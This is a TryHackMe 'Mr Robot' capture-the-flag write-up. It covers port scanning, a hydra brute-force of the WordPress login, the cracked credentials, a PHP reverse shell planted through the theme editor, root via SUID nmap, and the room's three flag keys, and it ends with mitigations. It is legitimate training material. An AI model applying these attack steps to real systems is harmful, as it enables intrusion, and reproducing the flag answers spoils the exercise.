# Mr Robot – TryHackMe Writeup

> Platform: TryHackMe  
> Room: Mr Robot  
> Difficulty: Medium  
> Focus: Web Exploitation | SSH Access | Privilege Escalation  
> Inspired by the TV series Mr. Robot  


## Nmap Scans 
``` bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.15 seconds
```
## Web Enumeration
```
gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
Important Findings
/robots.txt
/wp-login.php
/wp-admin
```
## Wordpress Bruteforce
```
hydra -L users.txt -P fsocity.dic <TARGET-IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
```
Credentials found
```
Username: Elliot
Password: ER28-0652 (Elliot's employee number)
```
## Reverse Shell via WordPress Editor
```
Steps :
Navigated to Appearance → Theme Editor
Modified a PHP template file
Inserted pentestmonkey PHP reverse shell
Set up Netcat listener
```

## Privilage escalation
```
sudo -l
find / -perm -4000 2>/dev/null

nmap was having root privilages - exploited it using "nmap -interaction"
```

## Keys
```
1.073403c8a58a1f80d943455fb30724b9
2. 822c73956184f694993bede3eb39f959
3.04787ddef27c3dee1ee161b21670b4e4
```

## This attcak could be mitigated by:
```
Disabling WordPress file editor
Strong password enforcement
Login rate limiting
Disabling XML-RPC
Monitoring repeated failed logins
Restricting wp-admin access
Auditing SUID binaries regularly
```
